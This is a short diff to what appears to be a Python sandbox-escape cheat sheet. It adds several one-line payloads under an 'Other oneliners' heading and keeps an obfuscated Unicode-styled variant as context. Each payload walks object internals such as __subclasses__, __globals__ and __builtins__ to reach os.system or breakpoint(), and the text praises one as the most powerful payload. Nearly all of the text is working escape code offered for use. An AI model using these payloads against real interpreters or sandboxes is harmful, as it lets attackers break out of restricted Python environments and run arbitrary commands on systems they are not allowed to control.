@@ -169,10 +169,14 @@ _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶
 [𝘺:=()._＿𝘥𝘰𝘤＿_, 𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
 ```
 
-### no builtins, no mro, single exec (that 0 remains the same)
-**The most stable and POWERFUL payload ever.** This is beautiful!
+### Other oneliners
 ```py
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
+().__class__.__subclasses__()[19].__repr__.__globals__["_sys"].modules["os"].system("ls")
+(1).__class__.__subclasses__()[2].__rand__.__globals__["sys"].modules["os"].system("ls")
+[].__class__.__subclasses__()[1].__init__.__builtins__["__import__"]("os").system("ls")
+[].__class__.__subclasses__()[1].__hash__.__builtins__["__import__"]("os").system("ls")
+
 ```
 ### Bypass parsers using comments and encodings
 This only works in certain cases:
